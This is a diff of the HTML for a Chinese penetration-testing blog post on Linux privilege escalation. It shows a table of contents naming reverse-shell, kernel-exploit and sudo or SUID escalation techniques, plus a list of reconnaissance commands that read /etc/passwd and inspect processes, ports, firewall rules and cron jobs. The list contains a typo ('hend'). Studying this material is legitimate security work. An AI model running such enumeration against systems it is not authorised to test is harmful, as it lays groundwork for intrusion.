@@ -12,97 +12,53 @@
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Uf9n1x's Blog" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">0x01 Linux常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">0x02 反弹shell命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">0x03 一些小问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81python%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%BB%88%E7%AB%AF"><span class="toc-number">3.1.</span> <span class="toc-text">1、python实现交互式shell终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%A7%A3%E5%86%B3linux%E5%8F%8D%E5%BC%B9shell%E4%B9%B1%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">2、解决linux反弹shell乱码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%EF%BC%88-%E5%88%A9%E7%94%A8searchsploit%E6%90%9C%E7%B4%A2%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">0x04 Linux内核漏洞提权（ 利用searchsploit搜索）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">4.0.1.</span> <span class="toc-text">1. 内核溢出提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-Linux-Exploit-Suggester"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">1.1 Linux_Exploit_Suggester</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83CVE-2016-5195"><span class="toc-number">4.0.2.</span> <span class="toc-text">2. 脏牛提权CVE-2016-5195</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E4%BD%BF%E7%94%A8dirty-c%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">4.0.2.1.</span> <span class="toc-text">1）使用dirty.c脚本进行提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%89%E4%BD%BF%E7%94%A8CVE-2016-5195%E6%8F%90%E6%9D%83"><span class="toc-number">4.0.2.2.</span> <span class="toc-text">2）使用CVE-2016-5195提权</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CVE-2017-16995-ubuntu%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.0.3.</span> <span class="toc-text">3.CVE-2017-16995 ubuntu内核漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%BB%A5%E7%94%A8sudo%E5%AF%BC%E8%87%B4%E7%9A%84%E6%8F%90%E6%9D%83-%E9%9C%80%E8%A6%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5sudo%E6%89%A7%E8%A1%8C%E6%9F%90%E4%BA%9B%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8F%88%E5%90%8Dsudo-%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">0x05 滥用sudo导致的提权(需要普通用户可以sudo执行某些命令，又名sudo 提权)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-git-%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">01.git 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-find%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">02.find提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-zip%E6%8F%90%E6%9D%83-%E6%A0%B8%E5%BF%83sudo%E6%B2%A1%E6%9C%89%E8%AF%A5%E5%91%BD%E4%BB%A4-%E5%A4%B1%E6%95%88"><span class="toc-number">5.3.</span> <span class="toc-text">03.zip提权( 核心sudo没有该命令,失效  )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-awk-x2F-morpheus%E6%8F%90%E6%9D%83"><span class="toc-number">5.4.</span> <span class="toc-text">04.awk&#x2F;morpheus提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-less-x2F-more-%E6%8F%90%E6%9D%83"><span class="toc-number">5.5.</span> <span class="toc-text">05.less**&#x2F;more**提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-man%E6%8F%90%E6%9D%83"><span class="toc-number">5.6.</span> <span class="toc-text">06.man提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-env%E6%8F%90%E6%9D%83"><span class="toc-number">5.7.</span> <span class="toc-text">07.env提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-ed%E6%8F%90%E6%9D%83"><span class="toc-number">5.8.</span> <span class="toc-text">08.ed提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#09-apt%E6%8F%90%E6%9D%83"><span class="toc-number">5.9.</span> <span class="toc-text">09.apt提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-pip%E6%8F%90%E6%9D%83"><span class="toc-number">5.10.</span> <span class="toc-text">10.pip提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-sed%E6%8F%90%E6%9D%83"><span class="toc-number">5.11.</span> <span class="toc-text">11.sed提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-tmux%E6%8F%90%E6%9D%83"><span class="toc-number">5.12.</span> <span class="toc-text">12.tmux提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-nmap%E6%8F%90%E6%9D%83"><span class="toc-number">5.13.</span> <span class="toc-text">13.nmap提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-taskset%E6%8F%90%E6%9D%83"><span class="toc-number">5.14.</span> <span class="toc-text">14.taskset提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-scp%E6%8F%90%E6%9D%83"><span class="toc-number">5.15.</span> <span class="toc-text">15.scp提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-ftp%E6%8F%90%E6%9D%83"><span class="toc-number">5.16.</span> <span class="toc-text">16.ftp提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-perl%E6%8F%90%E6%9D%83"><span class="toc-number">5.17.</span> <span class="toc-text">17.perl提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%B8%8D%E9%9C%80%E8%A6%81sudo%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">6.</span> <span class="toc-text">0x06.不需要sudo执行权限的提权方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-wget%E6%8F%90%E6%9D%83-%E5%8F%AF%E8%83%BD%E4%B9%9F%E9%9C%80%E8%A6%81sudo"><span class="toc-number">6.1.</span> <span class="toc-text">01.wget提权(可能也需要sudo)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83-%E9%85%8D%E5%90%88suid%E6%8F%90%E6%9D%83"><span class="toc-number">6.2.</span> <span class="toc-text">02.Ubuntu计划任务提权(配合suid提权)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-teehee%E6%8F%90%E6%9D%83"><span class="toc-number">6.3.</span> <span class="toc-text">03. teehee提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-%E8%84%9A%E6%9C%ACping%E6%8F%90%E6%9D%83"><span class="toc-number">6.4.</span> <span class="toc-text">04.脚本ping提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-%E5%AF%BB%E6%89%BE%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83"><span class="toc-number">6.5.</span> <span class="toc-text">05 寻找高权限用户提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-screen%E6%8F%90%E6%9D%83"><span class="toc-number">6.6.</span> <span class="toc-text">06 screen提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-SUID%E6%8F%90%E6%9D%83"><span class="toc-number">6.7.</span> <span class="toc-text">07 SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">6.7.0.1.</span> <span class="toc-text">其他利用方式：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-udf%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">0x07 udf提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E8%BF%98%E9%9C%80%E8%A6%81%E6%B6%88%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%BD%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">0x08 还需要消化的一些好文章：</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/avator3.JPG"></div><div class="author-info__name text-center">uf9n1x</div><div class="author-info__description text-center">websec</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/uf9n1x">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">46</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">37</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">35</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Some links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.cnblogs.com/uf9n1x/">博客园</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.yuque.com/uf9n1x">语雀</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://music.163.com/">Music</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-1313934826.cos.ap-chengdu.myqcloud.com/normal-images/psc.png#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Uf9n1x's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">内网渗透（三）Linux提权</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.5k</span><span class="post-meta__separator">|</span><span>阅读时长: 19 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>这篇文章介绍一下Linux权限提升。</p>
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">0x01 Linux常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">0x02 反弹shell命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">0x03 一些小问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81python%E5%AE%9E%E7%8E%B0%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%BB%88%E7%AB%AF"><span class="toc-number">3.1.</span> <span class="toc-text">1、python实现交互式shell终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%A7%A3%E5%86%B3linux%E5%8F%8D%E5%BC%B9shell%E4%B9%B1%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">2、解决linux反弹shell乱码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%EF%BC%88-%E5%88%A9%E7%94%A8searchsploit%E6%90%9C%E7%B4%A2%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">0x04 Linux内核漏洞提权（ 利用searchsploit搜索）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">4.0.1.</span> <span class="toc-text">1. 内核溢出提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1-Linux-Exploit-Suggester"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">1.1 Linux_Exploit_Suggester</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83CVE-2016-5195"><span class="toc-number">4.0.2.</span> <span class="toc-text">2. 脏牛提权CVE-2016-5195</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E4%BD%BF%E7%94%A8dirty-c%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">4.0.2.1.</span> <span class="toc-text">1）使用dirty.c脚本进行提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%89%E4%BD%BF%E7%94%A8CVE-2016-5195%E6%8F%90%E6%9D%83"><span class="toc-number">4.0.2.2.</span> <span class="toc-text">2）使用CVE-2016-5195提权</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CVE-2017-16995-ubuntu%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.0.3.</span> <span class="toc-text">3.CVE-2017-16995 ubuntu内核漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%BB%A5%E7%94%A8sudo%E5%AF%BC%E8%87%B4%E7%9A%84%E6%8F%90%E6%9D%83-%E9%9C%80%E8%A6%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5sudo%E6%89%A7%E8%A1%8C%E6%9F%90%E4%BA%9B%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8F%88%E5%90%8Dsudo-%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">0x05 滥用sudo导致的提权(需要普通用户可以sudo执行某些命令，又名sudo 提权)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-git-%E6%8F%90%E6%9D%83"><span class="toc-number">5.1.</span> <span class="toc-text">01.git 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-find%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text">02.find提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-zip%E6%8F%90%E6%9D%83-%E6%A0%B8%E5%BF%83sudo%E6%B2%A1%E6%9C%89%E8%AF%A5%E5%91%BD%E4%BB%A4-%E5%A4%B1%E6%95%88"><span class="toc-number">5.3.</span> <span class="toc-text">03.zip提权( 核心sudo没有该命令,失效  )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-awk-x2F-morpheus%E6%8F%90%E6%9D%83"><span class="toc-number">5.4.</span> <span class="toc-text">04.awk&#x2F;morpheus提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-less-x2F-more-%E6%8F%90%E6%9D%83"><span class="toc-number">5.5.</span> <span class="toc-text">05.less**&#x2F;more**提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-man%E6%8F%90%E6%9D%83"><span class="toc-number">5.6.</span> <span class="toc-text">06.man提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-env%E6%8F%90%E6%9D%83"><span class="toc-number">5.7.</span> <span class="toc-text">07.env提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-ed%E6%8F%90%E6%9D%83"><span class="toc-number">5.8.</span> <span class="toc-text">08.ed提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#09-apt%E6%8F%90%E6%9D%83"><span class="toc-number">5.9.</span> <span class="toc-text">09.apt提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-pip%E6%8F%90%E6%9D%83"><span class="toc-number">5.10.</span> <span class="toc-text">10.pip提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-sed%E6%8F%90%E6%9D%83"><span class="toc-number">5.11.</span> <span class="toc-text">11.sed提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-tmux%E6%8F%90%E6%9D%83"><span class="toc-number">5.12.</span> <span class="toc-text">12.tmux提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-nmap%E6%8F%90%E6%9D%83"><span class="toc-number">5.13.</span> <span class="toc-text">13.nmap提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-taskset%E6%8F%90%E6%9D%83"><span class="toc-number">5.14.</span> <span class="toc-text">14.taskset提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-scp%E6%8F%90%E6%9D%83"><span class="toc-number">5.15.</span> <span class="toc-text">15.scp提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-ftp%E6%8F%90%E6%9D%83"><span class="toc-number">5.16.</span> <span class="toc-text">16.ftp提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-perl%E6%8F%90%E6%9D%83"><span class="toc-number">5.17.</span> <span class="toc-text">17.perl提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%B8%8D%E9%9C%80%E8%A6%81sudo%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">6.</span> <span class="toc-text">0x06.不需要sudo执行权限的提权方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-wget%E6%8F%90%E6%9D%83-%E5%8F%AF%E8%83%BD%E4%B9%9F%E9%9C%80%E8%A6%81sudo"><span class="toc-number">6.1.</span> <span class="toc-text">01.wget提权(可能也需要sudo)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83-%E9%85%8D%E5%90%88suid%E6%8F%90%E6%9D%83"><span class="toc-number">6.2.</span> <span class="toc-text">02.Ubuntu计划任务提权(配合suid提权)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-teehee%E6%8F%90%E6%9D%83"><span class="toc-number">6.3.</span> <span class="toc-text">03. teehee提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-%E8%84%9A%E6%9C%ACping%E6%8F%90%E6%9D%83"><span class="toc-number">6.4.</span> <span class="toc-text">04.脚本ping提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-%E5%AF%BB%E6%89%BE%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83"><span class="toc-number">6.5.</span> <span class="toc-text">05 寻找高权限用户提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-screen%E6%8F%90%E6%9D%83"><span class="toc-number">6.6.</span> <span class="toc-text">06 screen提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-SUID%E6%8F%90%E6%9D%83"><span class="toc-number">6.7.</span> <span class="toc-text">07 SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">6.7.0.1.</span> <span class="toc-text">其他利用方式：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-udf%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">0x07 udf提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E8%BF%98%E9%9C%80%E8%A6%81%E6%B6%88%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%BD%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">0x08 还需要消化的一些好文章：</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/avator3.JPG"></div><div class="author-info__name text-center">uf9n1x</div><div class="author-info__description text-center">websec</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/uf9n1x">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">46</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">37</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">35</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Some links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.cnblogs.com/uf9n1x/">博客园</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.yuque.com/uf9n1x">语雀</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://music.163.com/">Music</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-1313934826.cos.ap-chengdu.myqcloud.com/normal-images/psc.png#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Uf9n1x's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">内网渗透（三）Linux提权</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.9k</span><span class="post-meta__separator">|</span><span>阅读时长: 20 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>这篇文章介绍一下Linux权限提升。</p>
 <span id="more"></span>
 
-<h2 id="0x01-Linux常用命令"><a href="#0x01-Linux常用命令" class="headerlink" title="0x01 Linux常用命令"></a>0x01 Linux常用命令</h2><pre class="line-numbers language-shell"><code class="language-shell">uname -a   #查看内核/操作系统/cpu信息
-hend -n 1 /etc/issue  #查看操作系统版本
-cat /proc/version   #查看系统信息
-hostname           #查看计算机名
-env                #查看环境变量
-ifconfig           #查看网卡与ip
-netstat -lntp       #查看所有监听端口
-netstat -antp       #查看所有已经建立的连接
-netstat -s          #查看网络统计信息
-iptables -L         #查看防火墙设置
-route -n            #查看路由表
-ps -ef              #查看所有进程
-top                #实时显示进程状态
-w                  #查看活动用户
-id                 #查看指定用户信息
-last               #查看用户登录日志
-cut -d: -f 1 /etc/passwd#查看系统所有用户
-cut -d: -f 1 /etc/group#查看系统所有组
-crontab -l          #查看当前用户的计划任务
-chkconfig –list     #列出所有系统服务
-chkconfig –list|grepon   #列出所有启动的系统服务
-//注意：Ubuntu 中 chkconfig 已经被 sysv-rc-conf 所替代
-echo$PATH          #查看系统路径
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="0x01-Linux常用命令"><a href="#0x01-Linux常用命令" class="headerlink" title="0x01 Linux常用命令"></a>0x01 Linux常用命令</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">uname -a   #查看内核/操作系统/cpu信息</span><br><span class="line">hend -n 1 /etc/issue  #查看操作系统版本</span><br><span class="line">cat /proc/version   #查看系统信息</span><br><span class="line">hostname           #查看计算机名</span><br><span class="line">env                #查看环境变量</span><br><span class="line">ifconfig           #查看网卡与ip</span><br><span class="line">netstat -lntp       #查看所有监听端口</span><br><span class="line">netstat -antp       #查看所有已经建立的连接</span><br><span class="line">netstat -s          #查看网络统计信息</span><br><span class="line">iptables -L         #查看防火墙设置</span><br><span class="line">route -n            #查看路由表</span><br><span class="line">ps -ef              #查看所有进程</span><br><span class="line">top                #实时显示进程状态</span><br><span class="line">w                  #查看活动用户</span><br><span class="line">id                 #查看指定用户信息</span><br><span class="line">last               #查看用户登录日志</span><br><span class="line">cut -d: -f 1 /etc/passwd#查看系统所有用户</span><br><span class="line">cut -d: -f 1 /etc/group#查看系统所有组</span><br><span class="line">crontab -l          #查看当前用户的计划任务</span><br><span class="line">chkconfig –list     #列出所有系统服务</span><br><span class="line">chkconfig –list|grepon   #列出所有启动的系统服务</span><br><span class="line">//注意：Ubuntu 中 chkconfig 已经被 sysv-rc-conf 所替代</span><br><span class="line"><span class="meta prompt_">echo$</span><span class="language-bash">PATH          <span class="comment">#查看系统路径</span></span></span><br></pre></td></tr></tbody></table></figure>
+
